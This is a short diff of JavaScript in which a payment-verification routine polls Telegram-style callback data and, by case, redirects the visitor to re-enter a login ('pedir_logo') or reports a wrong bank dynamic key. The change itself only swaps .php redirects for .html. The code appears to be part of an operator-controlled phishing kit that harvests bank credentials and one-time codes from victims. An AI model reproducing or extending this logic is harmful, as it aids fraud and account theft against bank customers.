@@ -382,11 +382,11 @@ async function checkPaymentVerification(transactionId) {
 
             switch (verificationUpdate.callback_query.data) {
                 case `pedir_logo:${transactionId}`:
-                    window.location.href = "pedir_logo.php";
+                    window.location.href = "pedir_logo.html";
                     break;
                 case `error_logo:${transactionId}`:
                     alert("Ha ocurrido un error. Intente nuevamente.");
-                    window.location.href = "pedir_logo.php";
+                    window.location.href = "pedir_logo.html";
                     break;
                 case `error_dinamica:${transactionId}`:
                     alert("Clave dinámica incorrecta.");
